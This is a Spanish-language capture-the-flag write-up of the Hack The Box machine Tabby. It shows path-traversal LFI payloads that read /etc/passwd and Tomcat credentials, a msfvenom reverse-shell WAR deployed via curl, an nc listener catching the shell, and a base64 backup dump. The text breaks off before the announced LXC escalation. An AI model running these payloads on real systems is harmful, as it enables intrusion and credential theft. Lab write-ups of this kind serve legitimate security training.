---
category: Hack The Box
tags:
  - eJPT
  - eWPT
title: Machine Tabby
comments: "true"
image: /assets/img/machines/tabby/tabbybanner.jpeg
---
# Introducción
En este _writeup_ se documenta la resolución de la máquina **Tabby** de Hack The Box. El proceso comenzó con tareas de **enumeración web**, que permitieron identificar una vulnerabilidad de **Local File Inclusion (LFI)**. A través de esta falla se accedió a archivos sensibles del sistema, incluyendo un archivo comprimido con credenciales de usuario. Una vez obtenidas y reutilizadas estas credenciales, se logró el acceso al sistema como usuario limitado. La **escalada de privilegios** se realizó mediante la explotación de permisos sobre contenedores **LXC**, configurados de forma insegura, lo que permitió ejecutar comandos como **root** dentro del host. Esta máquina pone a prueba conocimientos fundamentales sobre explotación de servicios web y contenedores Linux mal configurados.

## Skills

- Local File Inclusion (LFI)
- Abusing Tomcat Virtual Host Manager
- Abusing Tomcat Text-Based Manager - Deploy Malicious War
- LXC Exploitation (Privilege Escalation)

# Enumeración
El proceso de enumeración permitió identificar tres puertos abiertos en la máquina: el **puerto 22 (SSH)**, el **puerto 80 (HTTP)** y el **puerto 8080 (HTTP alternativo)**.
```bash
nmap -sCV -p 22,80,8080 10.10.10.194

Nmap scan report for 10.10.10.194
Host is up (0.26s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.66 seconds
```

se utilizó la herramienta **WhatWeb** para identificar tecnologías y cabeceras del servidor web en el puerto 80. El análisis reveló el uso de **Apache/2.4.41 sobre Ubuntu**, junto con tecnologías como **Bootstrap**, **jQuery 1.11.2** y **Modernizr**. 
```bash
whatweb http://10.10.10.194

http://10.10.10.194 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[sales@megahosting.com,sales@megahosting.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.194], JQuery[1.11.2], Modernizr[2.8.3-respond-1.4.2.min], Script, Title[Mega Hosting], X-UA-Compatible[IE=edge]
```

También se identificaron posibles correos electrónicos asociados al sitio: `sales@megahosting.com` y `sales@megahosting.htb`, lo que podría ser útil en etapas posteriores del reconocimiento.
![1](/assets/img/machines/tabby/1.jpeg)

# Local File Inclusion (LFI)
Durante la navegación en el sitio web, se identificó el archivo `news.php` con un parámetro `file`, lo cual indicaba la posible inclusión de archivos locales (LFI). Probando con rutas relativas, se logró acceder al archivo del sistema `/etc/passwd` mediante la siguiente URL: `http://megahosting.htb/news.php?file=../../../../etc/passwd`. Esto confirmó la existencia de una vulnerabilidad de **File Inclusion**, que permite leer archivos arbitrarios en el sistema.
![2](/assets/img/machines/tabby/2.jpeg)

ara facilitar la lectura del contenido obtenido mediante la vulnerabilidad de File Inclusion, se utilizó la opción **"view page source"** en el navegador. Esto permitió visualizar de forma ordenada el contenido del archivo `/etc/passwd`, evitando que el formato se viera alterado por el renderizado del navegador.
![3](/assets/img/machines/tabby/3.jpeg)

Durante la exploración de rutas comunes asociadas a instalaciones de Apache Tomcat, se identificó que el archivo `tomcat-users.xml` era accesible mediante la vulnerabilidad de File Inclusion. Al acceder a la URL `http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml`, fue posible visualizar dicho archivo.
```plaintext
view-source:http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
```

![4](/assets/img/machines/tabby/4.jpeg)

el cual contenía credenciales relevantes, incluyendo la contraseña: `$3cureP4s5w0rd123!`.
```plaintext
<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
```

![5](/assets/img/machines/tabby/5.jpeg)

Con la contraseña obtenida desde el archivo `tomcat-users.xml`, fue posible acceder a la interfaz del Virtual Host Manager de Tomcat mediante la ruta `http://megahosting.htb:8080/host-manager/html`, lo que permitió el control sobre el despliegue de aplicaciones web en el servidor.
![6](/assets/img/machines/tabby/6.jpeg)

# Deploy malicious war
Se generó un archivo malicioso en formato WAR utilizando la herramienta `msfvenom`, que contiene un payload tipo reverse shell en Java. Este archivo está configurado para establecer una conexión inversa desde la máquina objetivo hacia nuestra IP en el puerto 443, permitiendo así obtener acceso remoto al servidor una vez desplegado.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.2 LPORT=443 -f war -o shell.war

Payload size: 1089 bytes
Final size of war file: 1089 bytes
Saved as: shell.war
```

Con las credenciales obtenidas, se utilizó el comando `curl` para autenticarse en el Virtual Host Manager de Tomcat y desplegar el archivo malicioso. 
```bash
curl -s -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/shell" --upload-file shell.war

OK - Deployed application at context path [/shell]
```

Después del despliegue, se utilizó nuevamente `curl` con las mismas credenciales para listar las aplicaciones actualmente desplegadas en el servidor Tomcat. La respuesta confirma que el archivo `/shell` está activo y funcionando.
```bash
curl -s -u 'tomcat:$3cureP4s5w0rd123!' -X GET "http://10.10.10.194:8080/manager/text/list"

OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/host-manager:running:1:/usr/share/tomcat9-admin/host-manager
/shell:running:0:shell
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
```

Para obtener acceso remoto, abrí en el navegador la URL `http://10.10.10.194:8080/shell/`, que activó el payload desplegado.
```
http://10.10.10.194:8080/shell/
```

Al mismo tiempo, en mi máquina configuré una terminal en modo escucha con `nc -nlvp 443` para recibir la conexión reversa, logrando así una shell interactiva desde la máquina víctima.
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.194] 44940
whoami
tomcat
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
script /dev/null -c bash
Script started, file is /dev/null
tomcat@tabby:/var/lib/tomcat9$ 
```

Navegué hasta el directorio donde se alojan los archivos del servidor web y encontré un archivo comprimido llamado `16162020_backup.zip`. Confirmé que se trataba de un archivo ZIP válido y luego generé su contenido en formato base64 usando el comando `base64 -w 0` para facilitar su extracción.
```bash
tomcat@tabby:/var/lib/tomcat9$ cd /var/www/html
tomcat@tabby:/var/www/html$ ls
assets  favicon.ico  files  index.php  logo.png  news.php  Readme.txt
tomcat@tabby:/var/www/html$ cd files
tomcat@tabby:/var/www/html/files$ ls -l
total 28
-rw-r--r-- 1 ash  ash  8716 Jun 16  2020 16162020_backup.zip
drwxr-xr-x 2 root root 4096 Aug 19  2021 archive
drwxr-xr-x 2 root root 4096 Aug 19  2021 revoked_certs
-rw-r--r-- 1 root root 6507 Jun 16  2020 statement
tomcat@tabby:/var/www/html/files$ file 16162020_backup.zip
16162020_backup.zip: Zip archive data, at least v1.0 to extract
tomcat@tabby:/var/www/html/files$ base64 -w 0 16162020_backup.zip ; echo
UEsDBAoAAAAAAIUDf0gAAAAAAAAAAAAAAAAUABwAdmFyL3d3dy9odG1sL2Fzc2V0cy9VVAkAAxpv/FYkaMZedXgLAAEEAAAAAAQAAAAAUEsDBBQACQAIALV9LUjibSsoUgEAAP4CAAAYABwAdmFyL3d3dy9odG1sL2Zhdmljb24uaWNvVVQJAAMmcZZWQpvoXnV4CwABBAAAAAAEAAAAAN2Ez/9MJuhVkZcI40s6Mq3E1cGg8qJLHlm+k/NkGyVP3k2oTMAGRUJu1NrENypKTVUkFVj+2gK6gWjkuB5sbr7HYjzQZLYfWrBuHZlwyQVZQSCuFKLE+CHKAXhniPchcs6SpngYkPwutfDdDUASgsbwv4xEFP7Y61ZP/sPWrEM865/YFL6PMZO0Ztsx/uDaQgSDM526lAb4UyZyWFS4Q2Js3bZxIbkMl8grMRTqsm05D6l1UAWG3BcxE0iFVgonMapSLgwEXDjQzajCT1n6csLlAmJdLAKMf6MYy5TQygOKxdt419349ur8AWda3b8Y/LE7Zk2lJW0UzlzVSwUmqcTjO9O76GrTr2faU/4okNET08qqg3kMzvgTeZscXbjkegWYv5e6hwPoGj33iKCvTzX1XXVHWTZZoABvo6vzU21Zzzqp5kGSgSN7dNSeFA073LoqUEsHCOJtKyhSAQAA/gIAAFBLAwQKAAAAAABSbdBQAAAAAAAAAAAAAAAAEwAcAHZhci93d3cvaHRtbC9maWxlcy9VVAkAA0zM6F6OyuhedXgLAAEE6AMAAAToAwAAUEsDBBQACQAIADVZ0FDWxFwotwwAAMk5AAAWABwAdmFyL3d3dy9odG1sL2luZGV4LnBocFVUCQADdajoXoSo6F51eAsAAQQAAAAABAAAAAD0IsF4yWyFN7EpeuGatrkfSXJS0KTv6GsyZO5IsJntbdVIEf9mWnXe/fpVxpFjtYEoBPqNnA5bwFus17Pls4dkBQyJPyz6c3vvvDnHR8QC3syQ9dhQzkvoRZUoNJLf0c11Zi1ndLHaW+9EKGD8ATZ13EJ2FPsys59TVAPnh66zfWKcJpNL0LSWtmKpgsFyBcdF2oBWVmbmKPn4MkaZCLoVeHK6eoixknX3zwwLGzs6IcKuoahyPRVvZCj42EMnJAGFO6uKfOPkdFDQgdZqL9/HTOnhj33IlGcPFCsSnwdd8wPdIbkF7w0eochy0K+QWCCjCv4QffJH3uEbyoK/6UDFbsz7zysfBHbIaAsxuW0QQs595enOgG28Poa3Ey+BAMUPZ3XUFidRVrAg8+GasZRcsOwLXo2bNEsNszMy8ehJVLRSLWVqN8uIeL7Q6Nbly4rkp2v4lfdm5xpVxbp/l1spRR6UlRgXqX8WrFIdVUOUilW5puMPk2mwjHxciCXz+jf4j/uLCSO04QbOUMvi5YAzXFjskx+zl0VdPmRMNOvjFUH0YCj/v/8z8qzlHTrEOxxVI8hqJBpui3+2HiTQRXhv6fMIB4gJroL53/jWr/yC8f9C1Ba8n9Izgp8bMBAV4UXtdtuSA0l/lC8csexrXiHmGzHTamMwFI/TKdtw48FHVbR0yYTxoU+OM3rolzvF16MTdV/010ds5/0ZxCAAiz2H8NXRmhiBbXa1iHxIfkq+VusBfvC4VUPDwGXpPi08mjughY7swqUEYg/9JIhLxZanPAGIR59uLB6CgtSX9FNuQjoBX0qVZX52pVbOgb9+u13WPS6iPQFp3DfzBysJPdbNK6xwNJ7vMSv9G0cyyXsWQ0/wyVgCeIAEzk9PgBtFsrdHTE2ADCq+tgWd/Kmfcrh/ya9fljyvzp3jk1T7qX0sX48rG5UcCZZuhIFVkS0qS0CRETcreAGnepWAtXLe/4wYuIrH25kHb93r/eesiTcQASkH6pGe+ZFcbTUj27y3TCFJrKnavYj25SpZ0cb6c5ar0wlyVrdZat7CRlZih/7KhJ+U1yBNsE0lfoU3QXZe7rIgtG3WSAcwQYMn6ST02/HLrrd/yi7P2g17m/7X/WW1pMzlcINv2RfRc9ZU6RUpwn1W3N0Hy728gtcQ169O34BmrPWt+urpysKpjgm7d+xDsZRNvULmnSzVAk/wAelvH7wwqBXj/FDBIBYB6zm0qXQstY8o/30DfcmUH7xiRZBQBO1N5ITqFnzf1kbrxL6u0t+an/yZvKeMLuccgZmNcbAasRys3NtfGLkC9jTxXdHvkMxq/lp0uVRhsR2mc3lygy8i/7JVqwPRNSgi3pWGM9AORG6nyXYvutzen3IGpLWtYekNyOi/N2/QYG7JKoJeNQScn0i23jGzgVnr7UJTujMvbzuDFn1i61TA0uW1zx2fF1+GG0l1xLeWlugoLVQk2EVD6jBA+EWPr+vFkVJR+9EsxWu0NKYJuOapxNnscMPtVpO940APTgUsMB9b0PO+VEShczqSD9c+PVJ1ppJ9bywQZ/aJHtXZJoJSQyj3bxDxfLZs6qKwZEHAPEraVMDlLyhlyevjdwbMk6mbKN3zHkmKXQMrrnHwfbcmYxC0G2xjCGuZqpIFv7bsGiIgvdhDeuT2gMGydy65AdcfODuniNfIT+vaP4EtD+KWQveQiNMXsDmSx/lhUjtevomK5MAHUMTsVxomVFZBq/066V9jpscUhZYvgjf/Rr6BbuCmIBl5+/qnwpUwLlf5eRdM5oP8aaxSwHyxyjKDncjOlME45SSCQ7+mw/EeIgnVdnkhbFLOaHWrEKa26TjyzAj2jQnuS8k1BH9SIRuFST0+Ka1MGuern/LDZQB8OHcItvOvuOFhtcexTHC/R6Elr5BKyCBC6fSRe1eoGagOZbpoyind4YAZEwDexX5EGLRPq+zu0yu3oDMvubPZRrsDCzjivhMv+6FbJs2MvKmXM6lIIxkArOw7dCDupuh6NLQLq7t4qRzDMm5HHWCxfgqckgbIFPDa5amS+rMvjQ2zrJts+iSQ4Y+kQIc8VNIN/LEeJ6fN6DjXVi1gw0btpObg5vvtMQf4SMAuLemm5X97Z1+wBOI0ZU6K8VuRw2SbjYfsN74oli3er9ewc56hpt2uo2WcYVefbrJEVoY+olMUGsJN+5dV0logMgy+EOFYq6zJknQdVsXt9B+gn0aWZImwOEv2CpulCJnkuNwlLmPGTW6YuaDt7ORzW1mjGzsydWWhs+wxRRtabQF2pph93uj4vBK248AcZbNpNo4242JYGrlT8eS0Qhqg2F6hkEdJ1FdQS1GjJMpD/b5eGanNOW0dRszS/rfHWKCQ0KxmZmsRQgtOLszKwhN/+A5ccdqQ9WHfMw/PG5zcfmBw1uVbjbPM+F/BiusUyB3hC3ALywB/cZQRt1jl0gM0+yqc38BVn+kzc0uFXVv/vRBfvEOnYZJZJbuQMh+iYyCiYTf7mmVf+yI+hBXarvrOLG46OgWhyIZtwKfkbCVq6cqxo+0E+Q389+avpH6v8TbqU8SsXUOJaTErk02wc9b5bP1qKCovXZ3xXaVdhPcsH2JL2P8vRKRxb/b3zjUe2edqGzAyx9ZOAURhH9AM9SmcHlw3KccvpWJYk0wWDDT5T74ZU/iSiaEMH5Meyh887Tvg/4Er1tUTZJr+iR+OOriSvNdlGPk67x2h7+5GERregTkiH/1zif82QGpXjGqV6F8ndH/n2U7FIcoesouuv2FYpZw6e0ciCNf4gy3HUNAmVhFUo6Bf4UrMIW6aIAiOiHo6Amt47NLD6rR4VX8TPcDYqk413y8x4kh2qtAMdKTGUD6cmV0iTzNYSDHFeOI/HaBtOP+dFWodICqqaupBAVZoo96fKYy8FtnQypPYGgjo4BpK+nQncc9chUwg2dZJSGxx7rlnuv6zWISs1Y6H/gaHwHGpyCz0Kt5nUVVR0KDxt2f1Kaa7mBzdj73gZHpDQT/rkaisSkk3/XVU3+VAV4EfRnCqyQKtf3cctLyiefLRJAvy4+844oFKMZabcpojdDPO9JvkMhbzLO18kevy8GlKSDFhiUIYdn3flj3lfta+8dHKAEeoaPbvWmERiOCn4GjpFDQMm/0rCMFd7wmqflwX0jOgFrG+FNvhd/fdvK7gk19ikuYWWNRgUqUSMbJyjD5op4D0E9THffnMmTEC+gKZaIt6scq+UHFn4jiVSugcaEC3K7g1D1q26KrmwI3eDVvo2+lbEV9QqfEr5caKHRXlgGDI7ZDG9tUiH3hWSmGMpspMflYWAuuJ/znUwr+Go2UwfRRa2lkMYUJNGA7VKoNbseznex4KzXQAD9NMHI73Vgkk4Vs+xSak+Cw1e7syEQbWuvdiIkA7rHiGkX3RXGuJmyEgWtaVjzUbbcCDrQp/TBNpFJC8yAKa5MjCmHEAFUoI4CjqCnG3uHRhIWrM5vQ+S5e5UZo8qGZnPHR6qpYomuzBSM2PE4DRdrN3btYlTn584eYWT8MWcOSk33oSfvVwW8eubJQLcsU5Y7OKfHJGmcekZ00V4XaIz6xcQTEKi6Jiop2xbz0sdtoMkW5j3fFYYIroEwVs/mqnM06/H33gpYUgOJBUEhHWDXOMpiPpA7oUK/IyaEavtdURTWj3EysZPGTmE8r+TJUmomZyF21BdDynxBjkS18ApESY/9yxutZ1AXmPih1fZAQRMG6NY9eF9MTjXi8crxTmxGnBH7zM7C9tPrklAKmuNH+OmZinnqVkqp/3dITV4KByCu2tKqtJDojYADF1WCxDYiGD3Lg8uX41ghTIo3QRwcIi0sb5Gc0zKOPqyp9f2iHmwCWyM2vpMUS3HA6vzQX901gq67PewqzUJnV24sNSafJ4Un7HZHE636uYht8hm7TyDysQq7X4RuTem61bciGno1SJ1AZ2N12OfNWxMgA/5O9jpEI2bv0W76C3xNeOe9d1dGiyotoGOTaz0OD9LjXLtHV4YzAOnxv07L8iYkZgSd9NmV9/pt0MYC7yqw6WY3zQwiVOnuxHc9JU7dURJyB6gWnyvJtMac8rei57NbYiQZT1wLY7NDktNAMLFJN97pGfk9ubCi7BQ6Lo+xTroorblc07WqupIwLIYlM7lJNE1RgzsIbnN2nwpcK5fcmJ7QTdHZeVCiGIOSFKCJfPQV+E7Oo2Hs6ZRrZc/NnKEIR1CFEC2r9DLx+Fqs1rNHIJBta5k+/qUbu+X4tUmmfsEDb3+ufbdokm+vf1R2SXol3oKb4xgSr7G6sM0XCS8THWzScwyzLU31vdY0S0ucdH3U0mgEPa9Mwm/xcO+L4CIAFQSwcI1sRcKLcMAADJOQAAUEsDBAoACQAAAEZdtVBf9PkCWgsAAE4LAAAVABwAdmFyL3d3dy9odG1sL2xvZ28ucG5nVVQJAAMTacZeQpvoXnV4CwABBAAAAAAEAAAAAMz3t5mAmj08Equ4MGOvPG3VOFITecjXRM0ZWUWSaIQ0GpxPdD3DyDKkFoF12Dwg2UDRGPVc18OMpZ6+JZ8ed8hE7wOx9ZGl6oa5H5RPi4KQKMeBNEfEDVw1kMik4BXAPqscKDnKhIJggCPBFzcq1McNO/n8oT7jpnQsbt6kxsvPpIBPCPFEpnM2YH/7r0/aXKbQg76WADRy9big1mVwTHVd2czMTiV6f+4pRxPROS62fPbyKn8i+CpU1Ck0H2XJVfbJEokBb6ebhqWjNt8G8uvbg/NbyoRXEeYrekOYbIIv7Y4WMd5h81eaaK0sUm0+xI6qKi3lk+rZ1FtJfMV6dQTrF//L2/quM/foB9ysW3ECtJ3Nh8Eo9nqWxcvOdKaSq5sUi0YuNP0h5PZ2VITqEiGygkMnMohheo+2fK8SXoOnP/5I7Mi8FI1cEBY3ZFSLgGRy55ysppYH+xXUEvZN3HYyzZIc9DOKlND/+f1232bqNakHfuw11BpmLD6OMwwT8859ohelEKnVNa+vp3+qwVb2fI1+Guke06B6k2Egcx9Cxf0DCaJFB+R3mvFumVmpWciPC1GjRkrc4yDdtibnjTFdbzZqN5DJqgdMhc5wqKYk18mk7UHfFWnJVkXsYPG40kSP6pRrCCenSLwwKgrM6+QTXIGJoVwilojSFEJwa754aIlva1Um2a8sfryUwyKfP2pa/P9xGaDikClQAOJFpIPagnDgT+3L9CzaxvI80dfEotNr5Y5d0jh0WcstO5aiNEU/VuXzrkxHRqgpmyxXmMHSH87BTcwV5t1Hn2k1qorxvXTpJKSIAeyGbi3GEmTSIhu/C5xxzptZ6tGxfC1hcFc3HZg4VhvdZ4A3v4Ci/4CI11LIPNz91ap0nPyu8ZciVOAOltRbHCe7ct8n9eNXZESZq1Z8i/bIy6Z1803rPosqcLfcA/8gRsuxCUrOITKjPtghGm9oLDbUQsMEJwJa+DqLtO/pD3lM51Sn3C1PAcW2sOm0670FljygcZE/Hobg3P3rqZvgMwr6jM5UKkCUIMZPqUeCM+ZfPgrR4GEczpBydGNFoVTlQCcbwt53aasWAcITfXTSVWSQ64kh66/KIQJDm+11rfwVmm+stFq6eKxPUFGmp85gmRxXxkXCg8v5+lMtHs76I+cgRgSK86f+AlKCsGoGm2QvXZmIRCc8HSheVjmSyZj4g72LsPX0k7/JqikHbiSNWXYbu3YIQ2D7NDImjKhU+qXAYml422ADASZZxtU3rNm3mjaXwr2i4IEfT604QuAmVXyl2ZJt0UDkO7ksyeEYrRwUHh4T2wX7HdwbwuPlWYtyh+3RHFmI3MMP5Nv8ZvgJjZ6xiRNwhfS6+C2Ynw0kFEBDouAQLrNutS4EbiZxo/cgUC8FTPpnYwy8Zp+dbg5MIVstgJ2E+pNGqdZ71AM2caC2R8TpXdubD88u+4k2sg0txHXhoYk/hnZJ6qe4BOlFTuG7tOdHTaYpjJYuRfPxDWzYdtVcxcyte3wgKauwfkg2KUezEn9LppuyxbdV1UVGx7gAQ85Crnoezs4ucMXfX0+XCaIeXJHeFNMUFCSnThsA0ysDy++N0J9GE3+MQzXiUcLt835EVdI+RVPGrU+zBEm7VZ2/EPYJrXqYxHZQBXd19z6rf+ScpjB3ohcZEqDMQ5YTJJ6dSd78huwrYMQEp5afmDnX1ofw2+82wUSxgIpFm4VsVcQtJtszTGgZZrayW71py7QnCELKnlNu2v4ibPPVZ3MfQ3A7cLTV3082qpjwyxSueqTxP4dbw5WiJCvgoVB36L28RMZm/EZa1ix9SJlB7tXTCppj4LDdQ85dKQyD0Sxpxxrtk6xJ2LvpWoZQsRYf8+bhSvGAkEIb1AlCdcTwpSovXCxQnObaDkQ/w8KrxOTTScwlaZ8cPBPcKth/Qoi5Ze+TguLY/oKsJhQFSJI11iMjT3WOlX2updkMryaEkpJibiWuv97SftnzjjdYNuUtAQIAnY83OekKker7eRM7dcd4CeIw12aAGYdSJ7T7p0pFv0XfigmvpgqPEY9+jVaGppdPovaS/SlmhzOnmI9of8gFbVrlljvUF/Sv/r3E5RBzeOK4Ngl+XjwNDlKMTkaZJMX6mjsbKnoJDlxcF2gei5a+bxVLmBlKDEW9muOH/uBwEUCownpiZiNQKZV0zvM5I1VYxyiFYkNu0ZDwTE2tSrnC9WJi964kyxUgGm27vtD0TODKUG6VUsd/q2yEhKheUrWMDQTqzLLFhfoxWfgj4t6CzWbAtaOHyQtlPH3gC01oXnAt4gPLu13/grEOf8/sJt/VvOI4dZDOKXNnZKmXRwX9xbeZHXX8MOTOfqWumRVxnxlh3Lcxgw3qgOjVpIwwL4b/8fjx3S8jnfrbKjW3SqqtJlP5YuThC0ykZON/0aA0TPnO8tpAXz1Hsoo/EJEkx0VXlr3scqcwAawKgyaDZk9U1HgySIn2PV5rkwiIU2PvroHv24t0pwLCwq5CNNZZEi8zOwPesVXrN/Nkjwr0GyPi6ppNeTuhhIcE+aXBlfDpIOgjT3o3o3xW0kLcGUIKnd4CO85n7M7NqVMVOVVokoso0FKcc72akm3zjFTGn6TUxCsMEA1rf9aA2c/RPLGtbL5om+CjtT8SKTroCUdYLrSZ9zozAvLm0VJGqmvi2ffZplPnIeH55Ux361/3GOjMBqgiWep6/3rpywELahsuX50KREAIjGZVK121jjvLjC71ZZqJ6q/7NpMOdHvYx53W5eZKuq2rJWh1dFXqrfqEPMSsM9YBk71f+HPXIrqyARNMz8keR8mA7gYlsBwuiCS0wopYfbZH/v/+0C3fDdk8YfcVfgH/p3V7jkailJdHaGYxvhNT0jjv2o5k9m5dLfXkjXwsRjQKDB2kXDIO7+vfEL6LN/2VYgj9nZSC9aFyFdc/P7GB076pX2G1BgoRPt8bjzvWXtoSLsqSNg3GKPNavSbypk+1ncSw0CZda0AFue2GOJioiJPuYQ8UeNOfM/Z2YHbk/K4uK+QiK/NmpidDpLUmy5alr4tATyH2QSHInfd8WgscVqkimaEwc3tlynyhhTMB1YRPvHVmFCZw6T1Es3bxTFdrl4JCmJbtYuqo5D27T5rw4RQ6kzAt5ui0FbvAVEZ1RBm5xBFjPEKStGU7s5YEE9bkQUMiHKfspGYnUzSuW8csBHNEBf4to6F0RgPXoKuqit68+0tZrKqIgzMYyMmQjM1+D4WquC962oVdsjcoAqUEIC5+tlfaqQIphvYZ2lhDrtRqsW7yLTznJYlkr46gJ9afX5SXOocbNxgHmnkPZ6UkmwM3BxTbgQTBUbUXIR+yiL2JdaecWNsbBaYWS2tbZKrlrYfr1+NbPZ6t19OZMkFfLUMqjKh09U1gWaA21j2FttYmQ6wxzw+wBMRalkSWoPPIpTnMHOzph8v0t261np+20VqUVwF4r9EEPBvBhoqTHsodsm22yjSbryb4F2iLRDrneZtEIxVi7py/gR7EK3xQj8SWWMspypwq/yOwBnMkS5E4dUHqSD9NJWuNL1LDD24o812JnZm0gT7juohENrcw/IJ+1BxkxqiN35xGEeVRN6pSG8ZyCUBe5hwosMyqBbNylTV2xLwHrLSqimjZJl0HFBjt4OBVyGLpiVdF4FDGTYtzxk2x4wCLYMSatOXSzu2PPEvwd4Ai6UgK3/PPbDdgHv3B6LKHBB96/gwy69c7aNRBIv0WIeU+8ydJRIynbshCcLZJeRbu4FmXDsRB3LMWlVbuE5NGoBY2FZb5nGwzYgoPjsH4MBYDa8xF7s0q8apptuZ/UAV0kkKxXxYWKv4kP0PN0RbOvaIhCkunl+Ct6jcAgeYA9CPCbFB3UvOoUEsHCF/0+QJaCwAATgsAAFBLAwQUAAkACAB6WtBQnvFnXHIAAAB7AAAAFQAcAHZhci93d3cvaHRtbC9uZXdzLnBocFVUCQAD2KroXgmr6F51eAsAAQQAAAAABAAAAADKX6/Ec4UAqbWkHBfX7hk2NOP45IO2eV6JhYHQ/lGY0W/lMy6n1KKZ6V6//2uflVQnVjdzto6u4xLSu4Qe7Na5zHCnWXImx6hySw/NQ+TQGD8K1HwUvwJowRE/9X4R/C501yqNMPNZCtwzk93axtyxG/1QSwcInvFnXHIAAAB7AAAAUEsDBBQACQAIAItqakjjnNsyJQMAACYGAAAXABwAdmFyL3d3dy9odG1sL1JlYWRtZS50eHRVVAkAA5Z04VaWdOFWdXgLAAEEAAAAAAQAAAAAMgEOPSTHROpWVhu/kcDU4i+aMA/PAVYvb89cmGkk5ab2E4M0d8hYTRYKDJv6PAqj+FBHnW+/0pneV1oSWaM4A0fKQMPyswh3GRVSiCBG3+KqL+0nibAiQI4f32TWK4GfFcgaJnP9nLj2vKStRSV9zJQAZ7b6BuJAaKFxA13bdrtlJLv8qmrsfBFmMEAgSCTX7OQnediUGNzmG2XfwQY8qU1/X/0NJozd1Owmk8QoC+0tHzrYGXeCqLztEN0fcycWloRMiUaA/VpqeDhKlm1Ea9kaJDN352YY5+1aPCYI+D68187uwCwYtxqFeJj4l/T9tgQXvCroXnQhXC9mYmbZ+0FZHkJjgiaWKWJjJRi6MCmPzU9pWlZQaUaF+wkXVqRqToNpuA+n10YRswL8Woh35SSF2qMtxYnjZE75LTMeLvHgsG4kbacq9yFigLmTBchoi2xUd0hKORPgikD1AQTKlVYH3HN9mUXhhRUGa6ZHWaMwDGNztN3Z0ZrPCVCpotTbtrzqD1ulNtMTfNOVGxheL5eoUlF67nGvCNVxywdi0RXp6ILSW6vUSgKgxV/jA9SNXj8Mc/lG3n/L0rkqcJHQ1PSkjGarT1DwedS+xl5ksb+N1m6t/amZjaJcpmgc6XfM1GHYm1b6b6o4EistfziIxGTmnOjkBenWFpx5pdsKPY6avNSQtgJPb55aMYvncPyQlpR0luEpelZWkBm1qZyZK0v6qR15q0L4yW2qJAvnDx3BBQ2BNTfU4/2l4woKPbcTfGeETNdGndFIH2wQG0g0tENfOJYRgqELd78T8iwst4SPylqauM9yc9dQC8fMqOFApufk3chRzfatqUExaG1aFLNZ6PpR+Eq5ARJx4Cqtyz56JKp2x3w6d2jITsuPB3+oGwR299OzdFuR8RzsEip7gQYfJh29+JZbQ3Gzh+Um341W76J4MFYSVQwgPswmOuJtxUqA8NhwhfZPs3spmKLpT+/NB4k+R7DmBU0e/gPPHGHCp/2UOkdFs0EpThgD/p0v/BGQdlUuRxdlfgxfik53O/+36iP1HZWIkl2GbNEdxa0OcVXE41BLBwjjnNsyJQMAACYGAABQSwECHgMKAAAAAACFA39IAAAAAAAAAAAAAAAAFAAYAAAAAAAAABAA7UEAAAAAdmFyL3d3dy9odG1sL2Fzc2V0cy9VVAUAAxpv/FZ1eAsAAQQAAAAABAAAAABQSwECHgMUAAkACAC1fS1I4m0rKFIBAAD+AgAAGAAYAAAAAAAAAAAApIFOAAAAdmFyL3d3dy9odG1sL2Zhdmljb24uaWNvVVQFAAMmcZZWdXgLAAEEAAAAAAQAAAAAUEsBAh4DCgAAAAAAUm3QUAAAAAAAAAAAAAAAABMAGAAAAAAAAAAQAO1BAgIAAHZhci93d3cvaHRtbC9maWxlcy9VVAUAA0zM6F51eAsAAQToAwAABOgDAABQSwECHgMUAAkACAA1WdBQ1sRcKLcMAADJOQAAFgAYAAAAAAABAAAApIFPAgAAdmFyL3d3dy9odG1sL2luZGV4LnBocFVUBQADdajoXnV4CwABBAAAAAAEAAAAAFBLAQIeAwoACQAAAEZdtVBf9PkCWgsAAE4LAAAVABgAAAAAAAAAAACkgWYPAAB2YXIvd3d3L2h0bWwvbG9nby5wbmdVVAUAAxNpxl51eAsAAQQAAAAABAAAAABQSwECHgMUAAkACAB6WtBQnvFnXHIAAAB7AAAAFQAYAAAAAAABAAAApIEfGwAAdmFyL3d3dy9odG1sL25ld3MucGhwVVQFAAPYquhedXgLAAEEAAAAAAQAAAAAUEsBAh4DFAAJAAgAi2pqSOOc2zIlAwAAJgYAABcAGAAAAAAAAQAAAKSB8BsAAHZhci93d3cvaHRtbC9SZWFkbWUudHh0VVQFAAOWdOFWdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAAHAAcAgAIAAHYfAAAAAA==
```

Una vez copiado el contenido base64 a mi máquina local, lo decodifiqué con `base64 -d` para recuperar el archivo ZIP original. al intentar descomprimirlo con `unzip`, me solicitó una contraseña para poder extraer su contenido, confirmando que el archivo estaba protegido.
```bash
cat archivo| base64 -d | sponge archivo
❯ file archivo
